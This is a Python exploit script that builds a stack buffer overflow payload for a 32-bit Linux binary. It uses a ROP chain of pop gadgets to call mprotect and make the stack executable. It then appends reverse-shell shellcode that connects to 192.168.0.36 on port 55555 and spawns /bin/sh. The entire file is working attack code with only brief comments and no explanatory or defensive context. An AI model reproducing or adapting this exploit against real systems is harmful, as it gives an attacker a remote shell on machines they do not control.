import os, sys, struct

pop_eax = 0x08048425
pop_ebx = 0x08048427
pop_ecx = 0x08048429
pop_edx = 0x0804842B

push_esp = 0x0804842d
execute_syscall = 0x08048410

def address(data):
	return struct.pack("<L", data)
def littleendian(data):
	return struct.pack("<L", data)

padding = " "

shellcode = "\x68"
shellcode+= "\xC0\xA8\x00\x24"   # <- ip address 192.168.0.36
shellcode+= "\x5e\x66\x68"
shellcode+= "\xd9\x03"           # <- Port Number "55555"
shellcode+= "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
shellcode+= "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
shellcode+= "\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
shellcode+= "\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
shellcode+= "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
shellcode+= "\xeb\xce"


target_memory = 0xfffdd000         # Stack
#target_memory = 0xbffdf000

buffer = padding * 76
buffer += littleendian(0xDEADC0DE) #EBP overwrite

buffer += address(pop_eax)         # place value into EAX
buffer += littleendian(0x0000007D) # MProtect syscall number
 
buffer += address(pop_ebx)         # place value into EBX
buffer += address(target_memory)
 
buffer += address(pop_ecx)         # place value into ECX
buffer += littleendian(0x00021000) # Length of memory to change
 
buffer += address(pop_edx)
buffer += littleendian(0x00000007) # PROT_READ|PROT_WRITE|PROT_EXEC
 
buffer += address(execute_syscall)
# Stack is now executable. So lets call some shellcode

buffer += address(push_esp)	 	# push the esp pointer onto the stack, then return to it

buffer += shellcode			# time for some shellcode!

print(buffer)
